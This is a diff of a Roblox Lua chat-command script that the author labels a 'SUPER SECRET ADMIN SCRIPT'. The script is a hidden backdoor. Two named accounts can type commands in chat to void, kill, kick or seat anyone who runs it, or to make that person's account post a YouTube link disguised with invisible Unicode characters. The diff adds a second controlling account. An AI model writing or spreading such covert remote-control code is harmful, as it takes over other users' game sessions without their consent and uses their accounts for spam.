@@ -1,125 +1,124 @@
 local sexlist = {
-    "Real_revvybxnned1"
+	"Real_revvybxnned1",
+	"revsteppinsstand"
 }
-    function GetPlayer(String)
-    local plr
-    for i, v in pairs(game:GetService("Players"):GetPlayers()) do
-    if v.Name:lower():sub(1, #String) == String:lower() then
-    plr = v
-    end 
-    end
-    if String == "me" then
-    plr = game.Players.LocalPlayer
-    end
-    if String == "" or String == " " then
-    plr = nil
-    end
-    return plr
-    end
-    
-    local REV = "Real_revvybxnned1"
-    local TextChatService = game:GetService("TextChatService")
-    local Listening;
-    
-    
-    Listening = TextChatService.MessageReceived:Connect(function(prompt)
-       local speaker = tostring(prompt.TextSource)
-       local message = prompt.Text
-       local args = message:split(" ")
-       local cmd = args[1]
-       local who = args[2]
-       local target = GetPlayer(who)
-       local p = "Real_revvybxnned1"
-       local function getsexter(sexdude)
-        local x = false
-        for i,v in pairs(sexlist) do
-            if typeof(v) == "string" then
-                if v == sexdude then
-                    x = true
-                    break
-                end
-            elseif typeof(v) == "number" then
-                if v == sexdude then
-                    x = true
-                    break
-                end
-            end
-        end
-        return x
-    end
-       print(speaker)
-       print(message)
-       print(cmd)
-       print(target)
-       print(p)
-       
-       if cmd == ";void" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
-          h = target.Character.HumanoidRootPart
-          h.CFrame = h.CFrame - Vector3.new(0,1000,0)
-    
-     elseif cmd == ";void" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and who == "." then
-          h = game.Players.LocalPlayer.Character.HumanoidRootPart
-          h.CFrame = h.CFrame - Vector3.new(0,1000,0)
-    
-     elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
-       local textChatService = game:GetService("TextChatService")
-       textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
-    
-     elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and who == "." then
-       local textChatService = game:GetService("TextChatService")
-       textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
-          
-       elseif cmd == ";cmds" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
-       local textChatService = game:GetService("TextChatService")
-       textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐cmds are: reset,ac,void,kick,sit,ad,config.⭐")
-    
-       elseif cmd == ";cmds" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and who == "." then
-       local textChatService = game:GetService("TextChatService")
-       textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐cmds are: reset,ac,void,kick,sit,ad,config.⭐")
-    
-     elseif cmd == ";ad" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target  then
-       local textChatService = game:GetService("TextChatService")
-       textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("you𐌜⁥tube.𐌜⁥com/@normalexploiter123")
-    
-      elseif cmd == ";ad" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and who == "."  then
-       local textChatService = game:GetService("TextChatService")
-       textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("you𐌜⁥tube.𐌜⁥com/@normalexploiter123")
-    
-       elseif cmd == ";config" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
-       local textChatService = game:GetService("TextChatService")
-       textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("revvy config,made by rev")
-    
-     elseif cmd == ";config" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and who == "." then
-       local textChatService = game:GetService("TextChatService")
-       textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("revvy config,made by rev")
-       
-       elseif cmd == ";ac" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
-          h = target.Character.HumanoidRootPart
-          h.CFrame = h.CFrame - Vector3.new(0,4000,0)
-    
-     elseif cmd == ";ac" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and who == "." then
-          h = game.Players.LocalPlayer.Character.HumanoidRootPart
-          h.CFrame = h.CFrame - Vector3.new(0,4000,0)
-       
-       elseif cmd == ";reset" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
-       target.Character.Humanoid.Health = 0
-    
-     elseif cmd == ";reset" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and who == "." then
-       game.Players.LocalPlayer.Character.Humanoid.Health = 0
-    
-    elseif cmd == ";kick" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
-       target:Kick("skill issue tbh")
+function GetPlayer(String)
+	local plr
+	for i, v in pairs(game:GetService("Players"):GetPlayers()) do
+		if v.Name:lower():sub(1, #String) == String:lower() then
+			plr = v
+		end 
+	end
+	if String == "me" then
+		plr = game.Players.LocalPlayer
+	end
+	if String == "" or String == " " then
+		plr = nil
+	end
+	return plr
+end
 
-      elseif cmd == ";kick" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and who == "." then
-       game.Players.LocalPlayer:Kick("skill issue tbh")
-    
-    elseif cmd == ";sit" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and game.Players.LocalPlayer == target then
-       target.Character.Humanoid.Sit = true
-    
-    elseif cmd == ";sit" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= REV and who == "." then
-       game.Players.LocalPlayer.Character.Humanoid.Sit = true
-    
-    
-    end
-    end)
-    print("SUPER SECRET ADMIN SCRIPT 😳")
+local REV = "Real_revvybxnned1"
+local TextChatService = game:GetService("TextChatService")
+local Listening;
+
+
+Listening = TextChatService.MessageReceived:Connect(function(prompt)
+	local speaker = tostring(prompt.TextSource)
+	local message = prompt.Text
+	local args = message:split(" ")
+	local cmd = args[1]
+	local who = args[2]
+	local target = GetPlayer(who)
+	local function getsexter(sexdude)
+		local x = false
+		for i,v in pairs(sexlist) do
+			if typeof(v) == "string" then
+				if v == sexdude then
+					x = true
+					break
+				end
+			elseif typeof(v) == "number" then
+				if v == sexdude then
+					x = true
+					break
+				end
+			end
+		end
+		return x
+	end
+	print(speaker)
+	print(message)
+	print(cmd)
+	print(target)
+
+	if cmd == ";void" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+		h = target.Character.HumanoidRootPart
+		h.CFrame = h.CFrame - Vector3.new(0,1000,0)
+
+	elseif cmd == ";void" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+		h = game.Players.LocalPlayer.Character.HumanoidRootPart
+		h.CFrame = h.CFrame - Vector3.new(0,1000,0)
+
+	elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
+
+	elseif cmd == ";help" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐put the username after the cmd,or put . todo all⭐")
+
+	elseif cmd == ";cmds" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐cmds are: reset,ac,void,kick,sit,ad,config.⭐")
+
+	elseif cmd == ";cmds" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("⭐cmds are: reset,ac,void,kick,sit,ad,config.⭐")
+
+	elseif cmd == ";ad" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target  then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("you𐌜⁥tube.𐌜⁥com/@normalexploiter123")
+
+	elseif cmd == ";ad" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "."  then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("you𐌜⁥tube.𐌜⁥com/@normalexploiter123")
+
+	elseif cmd == ";config" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("revvy config,made by rev")
+
+	elseif cmd == ";config" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and who == "." then
+		local textChatService = game:GetService("TextChatService")
+		textChatService.ChatInputBarConfiguration.TargetTextChannel:SendAsync("revvy config,made by rev")
+
+	elseif cmd == ";ac" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+		h = target.Character.HumanoidRootPart
+		h.CFrame = h.CFrame - Vector3.new(0,4000,0)
+
+	elseif cmd == ";ac" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and who == "." then
+		h = game.Players.LocalPlayer.Character.HumanoidRootPart
+		h.CFrame = h.CFrame - Vector3.new(0,4000,0)
+
+	elseif cmd == ";reset" and getsexter(speaker) and game.Players.LocalPlayer.Name ~=speaker and game.Players.LocalPlayer == target then
+		target.Character.Humanoid.Health = 0
+
+	elseif cmd == ";reset" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+		game.Players.LocalPlayer.Character.Humanoid.Health = 0
+
+	elseif cmd == ";kick" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+		target:Kick("skill issue tbh")
+
+	elseif cmd == ";kick" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+		game.Players.LocalPlayer:Kick("skill issue tbh")
+
+	elseif cmd == ";sit" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and game.Players.LocalPlayer == target then
+		target.Character.Humanoid.Sit = true
+
+	elseif cmd == ";sit" and getsexter(speaker) and game.Players.LocalPlayer.Name ~= speaker and who == "." then
+		game.Players.LocalPlayer.Character.Humanoid.Sit = true
+
+
+	end
+end)
+print("SUPER SECRET ADMIN SCRIPT 😳")
